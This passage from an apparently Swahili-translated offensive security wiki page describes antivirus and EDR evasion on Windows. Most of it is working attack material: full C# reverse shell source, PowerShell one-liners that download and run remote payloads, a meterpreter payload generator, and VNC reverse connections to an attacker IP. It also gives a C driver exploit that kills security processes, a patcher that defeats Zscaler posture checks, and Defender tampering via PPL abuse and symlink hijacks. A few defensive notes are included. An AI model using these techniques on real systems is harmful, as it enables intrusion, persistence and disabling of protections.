Hapa kuna demo ya kupitisha SmartScreen kwa kufunga payloads ndani ya faili za ISO kwa kutumia [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) ni mfumo wenye nguvu wa kuandika matukio katika Windows unaowawezesha programu na vipengele vya mfumo **kurekodi matukio**. Hata hivyo, pia unaweza kutumika na bidhaa za usalama kufuatilia na kugundua shughuli zenye madhara.

Vivyo hivyo kama AMSI imezimwa (bypassed), pia inawezekana kufanya kazi ya **`EtwEventWrite`** ya mchakato wa user space irudi mara moja bila kurekodi matukio yoyote. Hii hufanywa kwa kupachika function hiyo kwenye memory ili irudi mara moja, kwa ufanisi kuizima uandishi wa ETW kwa mchakato huo.

Unaweza kupata maelezo zaidi katika **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) and [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.


## C# Assembly Reflection

Kuweka binaries za C# katika memory imejulikana kwa muda mrefu na bado ni njia nzuri sana ya kuendesha zana zako za post-exploitation bila kugunduliwa na AV.

Kwa kuwa payload itapakiwa moja kwa moja kwenye memory bila kugusa disk, tutalazimika tu kuwa na wasiwasi kuhusu kupachika AMSI kwa mchakato mzima.

Most C2 frameworks (sliver, Covenant, metasploit, CobaltStrike, Havoc, etc.) tayari hutoa uwezo wa kutekeleza C# assemblies moja kwa moja kwenye memory, lakini kuna njia tofauti za kufanya hivyo:

- **Fork\&Run**

Inahusisha **kuanzisha mchakato mpya wa sadaka**, kuingiza post-exploitation malicious code yako ndani ya mchakato huo mpya, kuendesha code yako ya uharifu na ukimaliza, kuua mchakato mpya. Hii ina faida na mapungufu. Faida ya njia ya fork and run ni kwamba utekelezaji hufanyika **nje** ya mchakato wetu wa Beacon implant. Hii ina maana kwamba ikiwa kitu katika hatua yetu ya post-exploitation kitakwenda vibaya au kitagunduliwa, kuna **uwezekano mkubwa zaidi** wa **implant yetu kuishi.** Mapungufu ni kwamba una **uwezekano mkubwa zaidi** wa kugunduliwa na **Behavioural Detections**.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

Ni kuhusu kuingiza post-exploitation malicious code **kwenye mchakato wake mwenyewe**. Kwa njia hii, unaweza kuepuka kuunda mchakato mpya na kukiskeniwa na AV, lakini hasara ni kwamba ikiwa kitu kitakwenda vibaya wakati wa utekelezaji wa payload yako, kuna **uwezekano mkubwa zaidi** wa **kupoteza beacon yako** kwani inaweza kugonga (crash).

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Ikiwa unataka kusoma zaidi kuhusu loading ya C# Assembly, tafadhali angalia makala hii [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) na InlineExecute-Assembly BOF yao ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

Unaweza pia kupakia C# Assemblies **kutoka PowerShell**, angalia [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) na [S3cur3th1sSh1t's video](https://www.youtube.com/watch?v=oe11Q-3Akuk).

## Using Other Programming Languages

Kama ilivyopendekezwa katika [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), inawezekana kutekeleza code ya uharifu kwa kutumia lugha nyingine kwa kumpa mashine iliyodukuliwa ufikaji **to the interpreter environment installed on the Attacker Controlled SMB share**.

Kwa kuruhusu upatikanaji wa Interpreter Binaries na mazingira kwenye SMB share unaweza **kuendesha arbitrary code in these languages within memory** ya mashine iliyodukuliwa.

The repo indicates: Defender still scans the scripts but by utilising Go, Java, PHP etc we have **more flexibility to bypass static signatures**. Testing with random un-obfuscated reverse shell scripts in these languages has proved successful.

## TokenStomping

Token stomping ni mbinu inayomruhusu mshambuliaji **kuchezea the access token au bidhaa ya usalama kama EDR au AV**, kuwapa uwezo wa kupunguza vibali ili mchakato usife lakini usiwe na ruhusa za kukagua shughuli zenye uharibifu.

Ili kuzuia hili Windows inaweza **kuzuia external processes** kupata handles juu ya token za michakato ya usalama.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Using Trusted Software

### Chrome Remote Desktop

Kama ilivyoelezwa katika [**this blog post**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide), ni rahisi tu kusanidi Chrome Remote Desktop kwenye PC ya mwathiri na kisha kuitumia kuiteka (takeover) na kudumisha persistence:
1. Pakua kutoka https://remotedesktop.google.com/, bonyeza "Set up via SSH", kisha bonyeza faili ya MSI ya Windows kupakua faili ya MSI.
2. Endesha installer kimya kwenye mwathiri (inahitaji admin): `msiexec /i chromeremotedesktophost.msi /qn`
3. Rudi kwenye ukurasa wa Chrome Remote Desktop na bonyeza next. Wizard itakuuliza uauthorize; bonyeza kitufe cha Authorize ili kuendelea.
4. Tekeleza parameter uliyopewa kwa mabadiliko machache: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (Kumbuka param ya pin inayoruhusu kuweka pin bila kutumia GUI).

## Advanced Evasion

Evasion ni mada ngumu sana; wakati mwingine lazima uzingatie vyanzo vingi tofauti vya telemetry katika mfumo mmoja, kwa hivyo ni karibu haiwezekani kubaki bila kugunduliwa kabisa katika mazingira yaliyostawi.

Kila mazingira unayokabiliana nayo yatawa na nguvu na udhaifu wake wenyewe.

Ninakuhimiza sana uangalie hotuba hii kutoka kwa [@ATTL4S](https://twitter.com/DaniLJ94), ili kupata ufahamu wa mbinu zaidi za Advanced Evasion techniques.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

Hii pia ni hotuba nzuri kutoka kwa [@mariuszbit](https://twitter.com/mariuszbit) kuhusu Evasion in Depth.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Mbinu za Kale**

### **Angalia sehemu gani Defender inazitambua kama hatari**

Unaweza kutumia [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck) ambayo ita **kuondoa sehemu za binary** hadi itakapogundua ni sehemu gani Defender inazitambua kama hatari na kukigawanya kwako.\
Zana nyingine inayofanya **kitu kimoja ni** [**avred**](https://github.com/dobin/avred) yenye tovuti inayoitoa huduma hiyo katika [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

### **Telnet Server**

Hadi Windows10, Windows zote zilitoka na **Telnet server** ambayo unaweza kusakinisha (kama msimamizi) kwa kufanya:
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
Fanya **ianze** wakati mfumo unapoanza na **iendeshe** sasa:
```bash
sc config TlntSVR start= auto obj= localsystem
```
**Badilisha telnet port** (stealth) na zima firewall:
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

Download it from: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (you want the bin downloads, not the setup)

**ON THE HOST**: Execute _**winvnc.exe**_ and configure the server:

- Washa chaguo _Disable TrayIcon_
- Weka nywila katika _VNC Password_
- Weka nywila katika _View-Only Password_

Kisha, hamisha binary _**winvnc.exe**_ na faili **newly** iliyoundwa _**UltraVNC.ini**_ ndani ya **victim**

#### **Reverse connection**

The **attacker** anapaswa **execute inside** kwenye **host** yake binary `vncviewer.exe -listen 5900` ili itakuwa tayari kukamata reverse **VNC connection**. Kisha, ndani ya **victim**: Anzisha daemon ya winvnc `winvnc.exe -run` na endesha `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`

**WARNING:** Ili kudumisha stealth lazima usifanye mambo kadhaa

- Usianze `winvnc` ikiwa tayari inaendeshwa au utasababisha a [popup](https://i.imgur.com/1SROTTl.png). Angalia ikiwa inaendeshwa kwa kutumia `tasklist | findstr winvnc`
- Usianze `winvnc` bila `UltraVNC.ini` kwenye saraka hiyo hiyo au itasababisha [the config window](https://i.imgur.com/rfMQWcf.png) kufunguka
- Usiendeshe `winvnc -h` kwa msaada au utasababisha a [popup](https://i.imgur.com/oc18wcu.png)

### GreatSCT

Download it from: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
Ndani ya GreatSCT:
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
Sasa **anza lister** kwa `msfconsole -r file.rc` na **tekeleza** **xml payload** kwa:
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**Defender wa sasa ataisha mchakato haraka sana.**

### Kucompile reverse shell yetu

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### C# Revershell ya kwanza

Icompile kwa:
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
Tumia pamoja na:
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### C# kwa kutumia compiler
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Kupakua na kutekeleza moja kwa moja:
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

Orodha ya obfuscators za C#: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](ps://github.com/l0ss/Group)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Kutumia python kwa mfano wa kujenga injectors:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Zana nyingine
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### Zaidi

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – Kuua AV/EDR kutoka Kernel Space

Storm-2603 ilitumia utiliti ndogo ya console iitwayo **Antivirus Terminator** kuzima kinga za endpoint kabla ya kuangusha ransomware. Zana hiyo ilinileta **dereva wake mwenye udhaifu lakini *iliyosasainiwa*** na kuitumia kutoa operesheni za cheo kwenye kernel ambazo hata huduma za AV za Protected-Process-Light (PPL) haziwezi kuzuia.

Mambo muhimu
1. **Dereva iliyosainiwa**: Faili iliyowekwa kwenye diski ni `ServiceMouse.sys`, lakini binary ni dereva iliyothibitishwa kisheria `AToolsKrnl64.sys` kutoka Antiy Labs’ “System In-Depth Analysis Toolkit”. Kwa sababu dereva ina sahihi ya Microsoft, inapakiwa hata wakati Driver-Signature-Enforcement (DSE) imewezeshwa.
2. **Service installation**:
```powershell
sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
sc start  ServiceMouse
```
Mstari wa kwanza unasajili dereva kama **kernel service** na wa pili unaifungua ili `\\.\ServiceMouse` iweze kupatikana kutoka user land.
3. **IOCTLs zinazotolewa na dereva**
| IOCTL code | Uwezo                              |
|-----------:|-----------------------------------------|
| `0x99000050` | Kumaliza mchakato wowote kwa PID (imetumika kuua huduma za Defender/EDR) |
| `0x990000D0` | Kufuta faili yoyote kwenye diski |
| `0x990001D0` | Kuondoa dereva na kuondoa service |

Minimal C proof-of-concept:
```c
#include <windows.h>

int main(int argc, char **argv){
DWORD pid = strtoul(argv[1], NULL, 10);
HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
CloseHandle(hDrv);
return 0;
}
```
4. **Kwa nini inafanya kazi**: BYOVD inazunguka kabisa ulinzi wa user-mode; msimbo unaotekelezwa kwenye kernel unaweza kufungua mchakato *uliohifadhiwa*, kuumaliza, au kuingilia vitu vya kernel bila kujali PPL/PP, ELAM au sifa nyingine za kuimarisha.

Ugundaji / Kupunguza Athari
• Wezesha orodha ya Microsoft ya kuzuia madereva yenye udhaifu (`HVCI`, `Smart App Control`) ili Windows izuie kupakia `AToolsKrnl64.sys`.  
• Fuatilia uundaji wa huduma mpya za *kernel* na toa tahadhari wakati dereva inapakiwa kutoka saraka inayoweza kuandikwa na kila mtu (world-writable) au haipo kwenye orodha ya kuruhusiwa.  
• Angalia mafungu (user-mode handles) kwa vitu maalum vya kifaa ikifuatiwa na simu zenye shaka za `DeviceIoControl`.

### Kupitisha ukaguzi wa Posture wa Zscaler Client Connector kwa kuhariri binaries zilizo kwenye diski

Zscaler’s **Client Connector** inatumia sheria za device-posture kwa ndani (locally) na inategemea Windows RPC kuwasilisha matokeo kwa vipengele vingine. Uchaguzi mbili dhaifu za muundo hufanya kupitisha kabisa kuwawezekana:

1. Tathmini ya posture hufanyika **kabisa upande wa client** (boolean hutumwa kwa server).  
2. Endpoints za ndani za RPC zinathibitisha tu kwamba executable inayounganisha ime **sainiwa na Zscaler** (kwa `WinVerifyTrust`).

Kwa **kurekebisha binaries nne zilizosaidiwa kwenye diski** mbinu zote mbili zinaweza kuzuilishwa:

| Binary | Mantiki iliyorekebishwa | Matokeo |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Inarudisha daima `1` hivyo kila ukaguzi unachukuliwa kuwa unakidhi |
| `ZSAService.exe` | Indirect call to `WinVerifyTrust` | NOP-ed ⇒ mchakato wowote (hata usiosainiwa) unaweza kuunganisha kwenye RPC pipes |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | Replaced by `mov eax,1 ; ret` |
| `ZSATunnel.exe` | Integrity checks on the tunnel | Imekatizwa (short-circuited) |

Toleo mfupi la patcher:
```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
data = f.read()
off = data.find(pattern)
if off == -1:
print("pattern not found")
else:
f.seek(off)
f.write(replacement)
```
Baada ya kubadilisha faili za asili na kuanzisha tena service stack:

* **Zote** posture checks zinaonyesha **kijani/inafuata**.
* Binary zisizotiwa saini au zilizorekebishwa zinaweza kufungua named-pipe RPC endpoints (kwa mfano `\\RPC Control\\ZSATrayManager_talk_to_me`).
* Host iliyoharibiwa inapata ufikivu usio na vikwazo kwenye mtandao wa ndani ulioainishwa na sera za Zscaler.

Somo hili la kesi linaonyesha jinsi maamuzi ya kuamini upande wa mteja peke yake na ukaguzi rahisi wa saini vinavyoweza kushindwa kwa mabadiliko machache ya byte.

## Kutumia vibaya Protected Process Light (PPL) ili kuhujumu AV/EDR kwa LOLBINs

Protected Process Light (PPL) inaweka hierarki ya signer/level ili tu protected processes zenye kiwango sawa au cha juu zaidi ziweze kuhujumu zinawezekana. Kwa upande wa shambulio, ikiwa unaweza kuanzisha kwa halali binary yenye PPL na kudhibiti vigezo vyake, unaweza kubadilisha utendakazi usiokuwa hatari (mf., logging) kuwa primitive ya kuandika iliyozuia, inayoungwa mkono na PPL, dhidi ya directories zilizo na ulinzi zinazotumika na AV/EDR.

Nini hufanya mchakato uendeshwe kama PPL
- EXE ya lengo (na DLLs zozote zilizo load) lazima ziwe zimesainiwa na EKU inayoweza PPL.
- Mchakato lazima uundwe kwa CreateProcess ukitumia flags: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
- Lazima utafte protection level inayolingana na signer wa binary (km., `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` kwa signers wa anti-malware, `PROTECTION_LEVEL_WINDOWS` kwa signers wa Windows). Viwango visivyofaa vitashindwa wakati wa uundaji.

Tazama pia utangulizi mpana wa PP/PPL na ulinzi wa LSASS hapa:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Launcher tooling
- Msaidizi wa open-source: CreateProcessAsPPL (huchagua protection level na hupitisha arguments kwa EXE ya lengo):
- [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)
- Mfano wa matumizi:
```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```
LOLBIN primitive: ClipUp.exe
- Binary ya mfumo iliyosainiwa `C:\Windows\System32\ClipUp.exe` inajizalisha na inakubali parameter ya kuandika log file kwenye path iliyoelezewa na mtumaji.
- Inapoanzishwa kama mchakato wa PPL, uandishi wa faili hufanyika ukiungwa mkono na PPL.
- ClipUp haiwezi kuchambua njia zenye nafasi; tumia 8.3 short paths ili kuelekeza kwenye maeneo yanayolindwa kwa kawaida.

8.3 short path helpers
- Orodhesha majina mafupi: `dir /x` in each parent directory.
- Derive short path in cmd: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Abuse chain (abstract)
1) Zindua LOLBIN inayounga mkono PPL (ClipUp) kwa `CREATE_PROTECTED_PROCESS` using a launcher (e.g., CreateProcessAsPPL).
2) Pitisha argument ya ClipUp log-path ili kulazimisha uundaji wa faili katika directory ya AV yenye ulinzi (e.g., Defender Platform). Tumia 8.3 short names ikiwa inahitajika.
3) Ikiwa binary lengwa kwa kawaida iko wazi/locked na AV wakati inapoendesha (e.g., MsMpEng.exe), panga uandishi ufanyike kwa boot kabla AV kuanza kwa kusanidi auto-start service ambayo inafanya kazi mapema kwa uhakika. Thibitisha boot ordering na Process Monitor (boot logging).
4) On reboot uandishi ulioungwa mkono na PPL hufanyika kabla AV kufunga binaries zake, ukiharibu faili lengwa na kuzuia startup.

Example invocation (paths redacted/shortened for safety):
```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```
Vidokezo na vizingiti
- Huwezi kudhibiti yaliyomo ambayo ClipUp inaandika zaidi ya mahali; primitive hii inafaa zaidi kwa kuharibu badala ya kuingiza yaliyomo kwa usahihi.
- Inahitaji local admin/SYSTEM ili kusanidi kuanzisha huduma na dirisha la reboot.
- Wakati ni muhimu: lengo halipaswi kuwa wazi; utekelezaji wakati wa boot huzuia kufungwa kwa faili.

Utambuzi
- Uundaji wa mchakato wa `ClipUp.exe` na hoja zisizo za kawaida, hasa ikiwa mzazi ni launchers zisizo za kawaida, karibu na boot.
- Huduma mpya zimetayarishwa kuanza moja kwa moja binaries zenye kushtuka na kuanza mara kwa mara kabla ya Defender/AV. Chunguza uundaji/badiliko la huduma kabla ya kushindwa kuanza kwa Defender.
- Ufuatiliaji wa uadilifu wa faili kwenye binaries/Platform za Defender; uundaji/badiliko usiotarajiwa wa faili na michakato yenye flag za protected-process.
- ETW/EDR telemetry: tafuta michakato iliyoundwa na `CREATE_PROTECTED_PROCESS` na matumizi ya kutiliwa shaka ya ngazi ya PPL na binaries zisizo za AV.

Mikakati ya kupunguza hatari
- WDAC/Code Integrity: zuia ni binaries zipi zilizosainiwa zinazoweza kuendesha kama PPL na chini ya wazazi gani; zuia kuitwa kwa ClipUp nje ya muktadha halali.
- Usafi wa huduma: zuia uundaji/badilisho la huduma zinazoanza moja kwa moja na fuatilia upotoshaji wa mpangilio wa kuanza.
- Hakikisha Defender tamper protection na early-launch protections zimewezeshwa; chunguza makosa ya kuanza yanayoashiria uharibifu wa binary.
- Fikiria kuzima uzalishaji wa majina mafupi ya 8.3 kwenye volumes zinazohifadhi zana za usalama ikiwa inafaa kwa mazingira yako (jaribu kwa kina).

Marejeo kwa PPL na zana
- Muhtasari wa Microsoft Protected Processes: https://learn.microsoft.com/windows/win32/procthread/protected-processes
- Marejeo ya EKU: https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88
- Procmon boot logging (uthibitishaji wa mpangilio): https://learn.microsoft.com/sysinternals/downloads/procmon
- CreateProcessAsPPL launcher: https://github.com/2x7EQ13/CreateProcessAsPPL
- Uandishi wa mbinu (ClipUp + PPL + boot-order tamper): https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html

## Kudanganya Microsoft Defender kupitia Platform Version Folder Symlink Hijack

Windows Defender huchagua platform inayotumika kwa kuorodhesha subfolders chini ya:
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

Inachagua subfolder yenye string ya toleo iliyo juu kwa mpangilio wa leksikografia (mfano, `4.18.25070.5-0`), kisha inaanzisha michakato ya huduma za Defender kutoka hapo (ikibadilisha njia za huduma/registry ipasavyo). Uteuzi huu unaamini vyanzo vya saraka ikiwemo directory reparse points (symlinks). Msimamizi anaweza kutumia hili kumuelekeza Defender kwenye njia inayoweza kuandikishwa na mshambuliaji na kupata DLL sideloading au kuharibu huduma.

Masharti ya awali
- Local Administrator (inahitajika kuunda saraka/symlinks chini ya folda ya Platform)
- Uwezo wa kufanya reboot au kusababisha upitishaji upya wa chaguo la platform ya Defender (restart ya huduma wakati wa boot)
- Zana za ndani pekee zinahitajika (mklink)

Kwa nini inafanya kazi
- Defender inalizuia kuandika ndani ya folda zake, lakini uteuzi wake wa platform unaamini vinyazo vya saraka na huchagua toleo la juu kwa mpangilio wa leksikografia bila kuthibitisha kwamba lengo linatimia hadi njia iliyolindwa/ya kuaminika.

Hatua kwa hatua (mfano)
1) Andaa nakala inayoweza kuandikwa ya folda ya platform ya sasa, kwa mfano `C:\TMP\AV`:
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) Tengeneza symlink ya directory ya toleo la juu ndani ya Platform ikielekeza kwenye folder yako:
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) Uchaguzi wa kichocheo (inapendekezwa kuanzisha upya):
```cmd
shutdown /r /t 0
```
4) Thibitisha MsMpEng.exe (WinDefend) inaendesha kutoka kwenye njia iliyohamishwa:
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
You should observe the new process path under `C:\TMP\AV\` and the service configuration/registry reflecting that location.

Post-exploitation options
- DLL sideloading/code execution: Angusha/badilisha DLLs ambazo Defender huzipakia kutoka kwenye application directory yake ili kutekeleza code katika processes za Defender. Tazama sehemu hapo juu: [DLL Sideloading & Proxying](#dll-sideloading--proxying).
- Service kill/denial: Ondoa version-symlink ili mara ijayo unapoanza, configured path haitatambuliwa na Defender itashindwa kuanza:
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```
> [!TIP]
> Kumbuka kwamba mbinu hii haitoi kuongezeka kwa ruhusa yenyewe; inahitaji haki za admin.

## API/IAT Hooking + Call-Stack Spoofing with PIC (Crystal Kit-style)

Red teams zinaweza kusogeza mbinu za kukwepa utambuzi wakati wa runtime kutoka kwenye implant ya C2 na kuweka ndani ya moduli lengwa yenyewe kwa ku-hook Import Address Table (IAT) yake na kupitisha API zilizochaguliwa kupitia code inayodhibitiwa na mshambuliaji, isiyotegemea nafasi (PIC). Hii inapanua mbinu za kukwepa utambuzi zaidi ya uso mdogo wa API ambao kits nyingi zinaonyesha (mf., CreateProcessA), na inaleta ulinzi ule ule kwa BOFs na post‑exploitation DLLs.

High-level approach
- Weka blob ya PIC kando ya moduli lengwa kwa kutumia reflective loader (imewekwa mbele au kama companion). PIC lazima iwe yenyewe‑mjumuiko na isiyotegemea nafasi.
- Wakati host DLL inapopakia, pitia IMAGE_IMPORT_DESCRIPTOR yake na rekebisha ingizo za IAT kwa imports zilizolengwa (mf., CreateProcessA/W, CreateThread, LoadLibraryA/W, VirtualAlloc) ili ziweze kuelekeza kwa thin PIC wrappers.
